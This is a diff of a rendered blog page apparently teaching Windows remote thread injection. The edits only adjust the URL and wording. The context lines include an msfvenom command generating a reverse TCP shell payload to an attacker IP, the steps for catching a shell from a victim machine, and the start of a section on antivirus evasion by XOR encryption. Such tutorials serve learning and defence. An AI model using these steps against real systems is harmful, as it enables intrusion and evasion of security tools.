@@ -7,7 +7,7 @@
 	<meta property="og:title" content="First malware : Windows Remote Thread Injection" />
 <meta property="og:description" content="Basic method to inject shellcode into a remote process" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="http://localhost:1313/posts/test/" /><meta property="article:section" content="posts" />
+<meta property="og:url" content="http://localhost:1313/posts/remote-process-injection/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2024-10-07T00:00:00+00:00" />
 <meta property="article:modified_time" content="2024-10-07T00:00:00+00:00" />
 
@@ -329,11 +329,11 @@ Before that, we will generate a basic msfvenom shellcode with the following comm
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/x64/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.244.137 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -f c
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># LHOST : Attacker IP </span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># LPORT : Local port, here 443 </span>
-</span></span></code></pre></div><p>We will then get our shellcode (bytes-formatted) that we&rsquo;re gonna put in a separate header file, so that the main code stay clean. (<strong>shellcode.h</strong>)
+</span></span></code></pre></div><p>We will then get our shellcode (bytes-formatted) put in a separate header file (<strong>shellcode.h</strong>), so that the main code stays clean.
 Now, all we have to do is to setup a basic netcat listener and execute our compiled program (main.exe) on our victim machine.<br>
 If everything went right (spoiler : it did) we will have a callback on the said listener, giving us a shell from the same victim machine !!</p>
 <p><img src="/images/injected.png" alt="targets"></p>
-<p>As we can see, ProcessHacker noticed the network connection that just happened, showing that we successfully injected our process to get our reverse shell !</p>
+<p>As we can see, ProcessHacker noticed the network connection that just happened, showing that we successfully injected the remote process to get our reverse shell !</p>
 <hr>
 <h1 id="av-evasion--single-byte-xor-encryption">AV Evasion : Single-byte XOR Encryption</h1>
 <p>Now let&rsquo;s talk a little about this piece of code :</p>
